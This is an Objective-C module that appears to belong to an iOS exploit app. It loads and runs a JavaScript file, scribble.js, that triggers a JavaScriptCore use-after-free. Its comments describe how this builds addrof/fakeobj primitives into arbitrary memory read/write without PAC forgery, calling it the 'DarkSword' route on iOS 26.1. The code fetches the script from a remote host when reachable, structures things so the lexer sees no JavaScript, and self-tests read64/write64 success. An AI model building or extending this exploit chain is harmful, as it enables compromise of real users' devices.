#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <JavaScriptCore/JavaScriptCore.h>
#import <dlfcn.h>
#import <mach-o/dyld.h>
#import <mach-o/loader.h>
#import <string.h>
#import <stdio.h>
#import "Modules.h"
#import "AppDelegate.h"
#import "Util.h"
#import "JSRun.h"

// ===========================================================================
// JSC read/write from addrof+fakeobj, without forging any PAC signature
// (the DarkSword "scribble" route, proven on iOS 26.1 with this same CVE).
//
// The script itself is Resources/scribble.js -- served live from the host when
// reachable, loaded from the bundle otherwise, and never inlined into C, so
// the Objective-C lexer sees no JavaScript at all.
//
// Runs in a JSContext (JavaScriptCore inside OUR process) -- NOT a WKWebView:
// on this build WebKit2 refuses to initialise inside a sideloaded app
// (SIGTRAP in WebKit::InitializeWebKit2), while JavaScriptCore works fine and the
// UAF trigger is pure JS with no DOM dependency.
//
// It runs on an 8 MB thread on purpose (see JSRun.h): the PoC's GC-pressure
// recursion needs a WebThread-sized stack or it dies with RangeError.
// ===========================================================================

NSString *ModJscScribbleRW(void) {
    AveLog(@"    JSC scribble R/W: DarkSword route from scribble.js (no WKWebView)");
    NSString *src = LoadJS(@"scribble.js");
    if (!src) {
        AvePost(@"SCRIBBLE scribble.js missing from the bundle");
        return @"scribble.js missing from the bundle";
    }
    NSString *r = RunJSBigStack(src, @"SCRIBBLE", 240);
    AveLog([NSString stringWithFormat:@"    scribble result: %@", r]);
    AvePost([NSString stringWithFormat:@"SCRIBBLE %@", r]);
    char q = '"';
    NSString *wok = [NSString stringWithFormat:@"%cwrite%c:true", q, q];
    NSString *rok = [NSString stringWithFormat:@"%cread%c:true", q, q];
    if ([r containsString:wok] && [r containsString:rok]) {
        AveSetStatus(@"arbitrary R/W ACTIVE in our own process, no PAC needed");
        return @"ARBITRARY R/W ACTIVE on 23C5027f: read64/write64 self-tested";
    }
    return r;
}
